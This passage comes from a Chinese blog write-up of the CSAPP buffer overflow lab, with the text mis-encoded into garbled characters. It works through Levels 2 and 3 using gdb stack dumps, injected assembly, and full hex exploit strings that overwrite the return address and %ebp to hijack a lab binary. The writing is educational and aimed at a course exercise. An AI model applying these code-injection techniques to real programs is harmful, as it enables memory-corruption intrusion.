ˆè·³è½¬åˆ°æŒ‡å®šåœ°å€ï¼‰</li>\n</ol>\n<p>ä½¿ç”¨åæ±‡ç¼–å·¥å…·å¾—åˆ°çš„å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">level2.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">25</span> dc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x2ac98515,<span class=\"number\">0</span>x804a1dc</span><br><span class=\"line\">   <span class=\"number\">7</span>:\t<span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a </span><br><span class=\"line\">   b:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">60</span> <span class=\"number\">8</span>d <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8048d60,(%rsp)</span><br><span class=\"line\">  <span class=\"number\">12</span>:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å› æ­¤æˆ‘ä»¬çš„æŒ‡ä»¤å­—èŠ‚ä¸ºï¼š<code>c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3</code></p>\n<p>è¿™é‡Œå…ˆç»™å‡ºæœ¬å±‚ç­”æ¡ˆï¼Œç„¶åçœ‹ä¸‹é¢çš„è¯´æ˜å°±èƒ½ç†è§£ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 60 ba ff ff c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3 </span><br></pre></td></tr></table></figure>\n<p>æ‰§è¡Œ <code>getbuff</code> å‡½æ•°ç»“æŸå‰ï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹æ ˆçš„åœ°å€ä»¥ä¾¿ç¡®å®šè·³è½¬åˆ°å“ªé‡Œï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) p /x $esp</span><br><span class=\"line\">$<span class=\"number\">1</span> = <span class=\"number\">0</span>xffffba40   â©</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba58   â–¶</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) x/<span class=\"number\">64</span>xb $esp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba40:â©  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    ğŸ˜€<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4cğŸ˜‰</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba58:â–¶  <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    â¤<span class=\"number\">0</span>x60    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xffâ¤</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba60:   â˜¢<span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x25    <span class=\"number\">0</span>xdc    <span class=\"number\">0</span>xa1    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08    <span class=\"number\">0</span>x15</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x85    <span class=\"number\">0</span>xc9    <span class=\"number\">0</span>x2a    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x24    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x8d</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba70:     <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08    <span class=\"number\">0</span>xc3â˜¢    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xef    <span class=\"number\">0</span>xbe    <span class=\"number\">0</span>xad    <span class=\"number\">0</span>xde</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba78:     <span class=\"number\">0</span>x98    <span class=\"number\">0</span>xcc    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x05    <span class=\"number\">0</span>x91    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br></pre></td></tr></table></figure>\n<p>ä¸Šé¢å†…å®¹æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œåœ¨ Level0 ä¸­å‡ºç°è¿‡ã€‚ğŸ˜€ğŸ˜‰æ ‡è®°å°±æ˜¯ç¨‹åºåˆ†é…çš„ 12 ä¸ªå­—èŠ‚ç¼“å†²åŒºï¼Œâ¤æ ‡è®°çš„æ˜¯è·³è½¬åˆ°çš„ç›®æ ‡åœ°å€ã€‚â˜¢æ ‡è®°çš„æ˜¯æ³¨å…¥çš„æŒ‡ä»¤ã€‚</p>\n<p>å› æ­¤â¤ä¸­åº”å¡«å†™ï¼š<code>0xffffba60</code> å¯¹åº”çš„å°ç«¯ç¼–ç ã€‚</p>\n<p>ç¨‹åºç»“æœä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Bang!: You set global_value to 0x2ac98515</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-3-ç‚¸è¯é€‰åš\"><a class=\"markdownIt-Anchor\" href=\"#level-3-ç‚¸è¯é€‰åš\"></a> Level 3 - ç‚¸è¯ã€é€‰åšã€‘</h2>\n<blockquote>\n<p>æœ¬å±‚ä¸ºç»¼åˆå‘æ•£è€ƒå¯Ÿã€‚</p>\n</blockquote>\n<p>å…³äºæœ¬å±‚çš„æç¤ºï¼Œåœ¨ä¸Šé¢ 3 å±‚çš„ç­”æ¡ˆä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>ff ff ff ff</code> æŠŠ <code>%ebp</code> çš„å€¼è¦†ç›–æ‰äº†ã€‚ä½†è¿™ä¸€å±‚ä¸å¤ªä¸€æ ·ï¼Œå®ƒä¼šæ£€æµ‹ <code>%ebp</code> çš„å€¼æ˜¯å¦æ”¹åŠ¨ã€‚</p>\n<p>é¦–å…ˆç»™å‡ºäº†å®Œæ•´çš„ test å‡½æ•°ï¼š</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> val; </span><br><span class=\"line\">\t<span class=\"keyword\">volatile</span> <span class=\"type\">int</span> local = <span class=\"number\">0xdeadbeef</span>; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">3</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\tval = getbuf(); </span><br><span class=\"line\">\t<span class=\"comment\">/* Check for corrupted stack */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (local != <span class=\"number\">0xdeadbeef</span>) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sabotaged!: the stack has been corrupted\\n&quot;</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Boom!: getbuf returned 0x%x\\n&quot;</span>, val);   <span class=\"comment\">// æˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°è¿™é‡Œ</span></span><br><span class=\"line\">\t\tvalidate(<span class=\"number\">3</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Dud: getbuf returned 0x%x\\n&quot;</span>, val); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¦ç‚¹ï¼š</p>\n<ol>\n<li><code>val</code> æ˜¯ <code>getbuf()</code> çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¿™ä¸ªè¿”å›å€¼ä¸ºæˆ‘ä»¬çš„ cookie</li>\n<li>ä¿è¯ç¨‹åºåœ¨å– <code>local</code> æ—¶èƒ½æ­£ç¡®å–åˆ°é­”æ•° <code>0xdeadbeef</code></li>\n</ol>\n<p>è§‚å¯Ÿ test æ±‡ç¼–ä»£ç ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8049000 &lt;test&gt;:</span><br><span class=\"line\"> <span class=\"number\">8049000</span>:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8049001</span>:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8049003</span>:\t<span class=\"number\">83</span> ec <span class=\"number\">18</span>             \tsub    $<span class=\"number\">0</span>x18,%esp</span><br><span class=\"line\"> <span class=\"number\">8049006</span>:\tc7 <span class=\"number\">45</span> fc ef be ad de \tmovl   $<span class=\"number\">0</span>xdeadbeef,-<span class=\"number\">0</span>x4(%ebp) ; %ebp: <span class=\"number\">0</span>xffffba78</span><br><span class=\"line\"> <span class=\"number\">804900</span>d:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>3 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x3,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049014</span>:\te8 <span class=\"number\">87</span> f9 ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8049019</span>:\te8 c2 ff ff ff       \tcall   <span class=\"number\">8048</span>fe0 &lt;getbuf&gt;</span><br><span class=\"line\"> <span class=\"number\">804901</span>e:\t<span class=\"number\">89</span> c2                \tmov    %eax,%edx        # %edx å­˜å‚¨ getbuf è¿”å›å€¼</span><br><span class=\"line\"> <span class=\"number\">8049020</span>:\t<span class=\"number\">8</span>b <span class=\"number\">45</span> fc             \tmov    -<span class=\"number\">0</span>x4(%ebp),%eax  # local = -<span class=\"number\">0</span>x4(%ebp)</span><br><span class=\"line\"> <span class=\"number\">8049023</span>:\t<span class=\"number\">3</span>d ef be ad de       \tcmp    $<span class=\"number\">0</span>xdeadbeef,%eax</span><br><span class=\"line\"> <span class=\"number\">8049028</span>:\t<span class=\"number\">74</span> <span class=\"number\">0</span>e                \tje     <span class=\"number\">8049038</span> &lt;test+<span class=\"number\">0</span>x38&gt; # å¿…é¡»ç›¸ç­‰</span><br><span class=\"line\"> <span class=\"number\">804902</span>a:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> b8 <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x80498b8,(%esp)</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x80498b8</span><br><span class=\"line\">; $<span class=\"number\">10</span> = <span class=\"number\">0</span>x80498b8 <span class=\"string\">&quot;Sabotaged!: the stack has been corrupted&quot;</span></span><br><span class=\"line\"> <span class=\"number\">8049031</span>:\te8 de f6 ff ff       \tcall   <span class=\"number\">8048714</span> &lt;puts<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049036</span>:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8049037</span>:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8049038</span>:\t<span class=\"number\">3</span>b <span class=\"number\">15</span> cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%edx #  <span class=\"number\">0</span>x804a1cc å­˜å‚¨çš„æ˜¯cookieå­—ç¬¦ä¸² <span class=\"number\">0</span>x2ac98515 å¯¹åº”æˆ‘çš„å­¦å·</span><br><span class=\"line\"> <span class=\"number\">804903</span>e:\t<span class=\"number\">74</span> <span class=\"number\">12</span>                \tje     <span class=\"number\">8049052</span> &lt;test+<span class=\"number\">0</span>x52&gt;  # å¿…é¡»ç›¸ç­‰</span><br><span class=\"line\"> <span class=\"number\">8049040</span>:\t<span class=\"number\">89</span> <span class=\"number\">54</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %edx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049044</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">9</span>b <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a9b,(%esp)</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a9b</span><br><span class=\"line\">; $<span class=\"number\">11</span> = <span class=\"number\">0</span>x8049a9b <span class=\"string\">&quot;Dud: getbuf returned 0x%x\\n&quot;</span></span><br><span class=\"line\"> <span class=\"number\">804904</span>b:\te8 <span class=\"number\">14</span> f7 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049050</span>:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8049051</span>:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8049052</span>:\t<span class=\"number\">89</span> <span class=\"number\">54</span> <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %edx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049056</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">7</span>e <span class=\"number\">9</span>a <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049a7e,(%esp) #  &lt;- ç›®æ ‡å­—ç¬¦ä¸²</span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049a7e</span><br><span class=\"line\">; $<span class=\"number\">12</span> = <span class=\"number\">0</span>x8049a7e <span class=\"string\">&quot;Boom!: getbuf returned 0x%x\\n&quot;</span></span><br><span class=\"line\"> <span class=\"number\">804905</span>d:\te8 <span class=\"number\">0</span>2 f7 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"> <span class=\"number\">8049062</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>3 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x3,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8049069</span>:\te8 <span class=\"number\">72</span> fa ff ff       \tcall   <span class=\"number\">8048</span>ae0 &lt;validate&gt;</span><br><span class=\"line\"> <span class=\"number\">804906</span>e:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">804906</span>f:\tc3                   \tret </span><br></pre></td></tr></table></figure>\n<p>ä»£ç è§‚å¯Ÿï¼š</p>\n<ul>\n<li>åœ°å€ <code>8049006</code>ï¼šè§‚å¯Ÿåˆ°ï¼Œ<code>$0xdeadbeef</code> å­˜å‚¨åœ¨ <code>-0x4(%ebp)</code>ï¼Œæ­¤æ—¶å¯¹åº”çš„ <code>%ebp</code> ä¸º: <code>0xffffba78</code>ï¼Œä¹Ÿå°±æ˜¯ <code>$0xdeadbeef</code> å­˜å‚¨åœ¨ <code>0xffffba74</code>ã€‚</li>\n<li>åœ°å€ <code>804901e</code>ï¼š<code>%edx</code> å­˜å‚¨ <code>getbuf</code> è¿”å›å€¼</li>\n<li>åœ°å€ <code>8049020</code> åˆ° <code>8049028</code>ï¼šå°† <code>-0x4(%ebp)</code> å–å‡ºæ¥å’Œ <code>$0xdeadbeef</code> æ¯”è¾ƒã€‚</li>\n<li>åœ°å€ <code>8049038</code> åˆ° <code>804903e</code>ï¼šæ¯”è¾ƒ <code>getbuf</code> è¿”å›å€¼å’Œ cookie æ˜¯å¦ç›¸ç­‰</li>\n</ul>\n<p>æˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°æ‰§è¡Œç»“æœä¸€èˆ¬æ”¾åœ¨ <code>%eax</code>ï¼Œ<code>getbuf</code> å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æŒ‡ä»¤ï¼Œåº”è¯¥è¦ä¿®æ”¹ <code>%eax</code> ä¸ºæˆ‘ä»¬çš„ cookieï¼Œåœ¨ <code>getbuf</code> å‹å…¥ test å‡½æ•°è°ƒç”¨æ—¶æ­£å¸¸è¿”å›çš„ä½ç½® <code>0x804901e</code>ã€‚åœ¨è¿”å›åˆ° test æ—¶ä¼šä½¿ç”¨ <code>%ebp</code>ï¼Œæˆ‘ä»¬çš„æ³¨å…¥ä»£ç ä¸åº”è¯¥åŠ¨è¿™ä¸ªå€¼ã€‚</p>\n<h3 id=\"æ–¹æ¡ˆ-1è¦†ç›–æ­£ç¡®çš„-ebp\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ¡ˆ-1è¦†ç›–æ­£ç¡®çš„-ebp\"></a> æ–¹æ¡ˆ 1ï¼šè¦†ç›–æ­£ç¡®çš„ <code>%ebp</code></h3>\n<p>ç¼–å†™çš„ <code>level3.s</code> ä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $0x2ac98515,%eax</span><br><span class=\"line\">movl $0x804901e,(%rsp)</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>å¾—åˆ°çš„åæ±‡ç¼–æ–‡ä»¶ï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">level3.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tb8 <span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a       \tmov    $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">   <span class=\"number\">5</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">1</span>e <span class=\"number\">90</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">   c:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ç¼–å†™æŒ‡ä»¤åšä¸¤ä»¶äº‹ï¼š</p>\n<ol>\n<li>ä¿®æ”¹ <code>getbuf</code> çš„è¿”å›å€¼</li>\n<li>è·³è½¬åˆ° <code>test</code> æ­£ç¡®çš„ä½ç½®</li>\n</ol>\n<p>ç­”æ¡ˆï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ç­”æ¡ˆ 1 </span><br><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ğŸ”¹78 ba ff ffğŸ”¹ â¤60 ba ff ffâ¤ â˜¢b8 15 85 c9 2a c7 04 24 1e 90 04 08 c3â˜¢</span><br></pre></td></tr></table></figure>\n<p>â¤æ ‡è®°äº†æŒ‡ä»¤æ‰§è¡Œåœ°å€ï¼Œâ˜¢æ ‡è®°äº†æ³¨å…¥çš„æŒ‡ä»¤ï¼ŒğŸ”¹æ ‡è®°äº†è¦†ç›–çš„ <code>%ebp</code>ï¼š<code>0xffffba78</code></p>\n<h2 id=\"æ–¹æ¡ˆ-2æŒ‡ä»¤ä¿®æ”¹ä¸ºæ­£ç¡®çš„-ebp\"><a class=\"markdownIt-Anchor\" href=\"#æ–¹æ¡ˆ-2æŒ‡ä»¤ä¿®æ”¹ä¸ºæ­£ç¡®çš„-ebp\"></a> æ–¹æ¡ˆ 2ï¼šæŒ‡ä»¤ä¿®æ”¹ä¸ºæ­£ç¡®çš„ <code>%ebp</code></h2>\n<p>å¦å¤–ä¸€ç§ç­”æ¡ˆä¸ºåœ¨æŒ‡ä»¤ä¸­ä¿®æ”¹æ­£ç¡®çš„ <code>%ebp</code> çš„å€¼ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸¤è€…å®ç°çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p>\n<p>ç¼–å†™çš„ <code>level3.s</code> ä¸ºï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movl $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">movl $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">movl $<span class=\"number\">0</span>xffffba78,%ebp</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>åæ±‡ç¼–ç»“æœï¼š</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">level3.o:     file format elf64-x86-<span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span>000000000000000 &lt;.text&gt;:</span><br><span class=\"line\">   <span class=\"number\">0</span>:\tb8 <span class=\"number\">15</span> <span class=\"number\">85</span> c9 <span class=\"number\">2</span>a       \tmov    $<span class=\"number\">0</span>x2ac98515,%eax</span><br><span class=\"line\">   <span class=\"number\">5</span>:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">1</span>e <span class=\"number\">90</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x804901e,(%rsp)</span><br><span class=\"line\">   c:\tbd <span class=\"number\">78</span> ba ff ff       \tmov    $<span class=\"number\">0</span>xffffba78,%ebp</span><br><span class=\"line\">  <span class=\"number\">11</span>:\tc3                   \tretq   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ç­”æ¡ˆæ–‡ä»¶ <code>exploit3.txt</code> ä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ç­”æ¡ˆ 2 ã€‚å…¶ä¸­ zz zz zz zz ä¸ºä»»æ„åå…­è¿›åˆ¶æ•°</span><br><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ğŸ”¹zz zz zz zzğŸ”¹ â¤60 ba ff ffâ¤ â˜¢b8 15 85 c9 2a c7 04 24 1e 90 04 08 â—¾bd 78 ba ff ffâ—¾ c3â˜¢</span><br></pre></td></tr></table></figure>\n<p>â—¾æ ‡è®°äº†æ–°å¢çš„æŒ‡ä»¤ã€‚</p>\n<p>æœ€ç»ˆ <code>bufbomb</code> ç¨‹åºç»“æœä¸ºï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Boom!: getbuf returned 0x2ac98515</span><br></pre></td></tr></table></figure>\n<h1 id=\"æœ¬æ–‡å‚è€ƒ\"><a class=\"markdownIt-Anchor\" href=\"#æœ¬æ–‡å‚è€ƒ\"></a> æœ¬æ–‡å‚è€ƒ</h1>\n<ul>\n<li><a href=\"https://blog.csdn.net/yasi_xi/article/details/9263955\">gdbä¸­çœ‹å†…å­˜(xå‘½ä»¤)_gdb æŸ¥çœ‹å†…å­˜x-CSDNåšå®¢</a></li>\n<li><a href=\"https://blog.csdn.net/a523442148/article/details/101253155\">ä¿®æ”¹ç¨‹åºå †æ ˆçš„å¯æ‰§è¡Œå±æ€§-CSDNåšå®¢</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/629686088\">CSAPPè¯¾ç¨‹Lab3 attack - çŸ¥ä¹ (zhihu.com)</a></li>\n</ul>\n","raw":"---\ntitle: CSAPP LAB-3 ç¼“å†²åŒºæº¢å‡ºç‚¸å¼¹\ntags:\n  - CSAPP\n  - C\n  - ASM\n  - GDB\n  - objdump\ncover: https://cdn.gallery.uuanqin.top/img/202501232353097.webp\ndescription: ç¼“å†²åŒºæº¢å‡ºæ”»å‡»å®éªŒ\ncategories:\n  - CSAPP LABS\nabbrlink: '67787353'\ndate: 2024-05-26 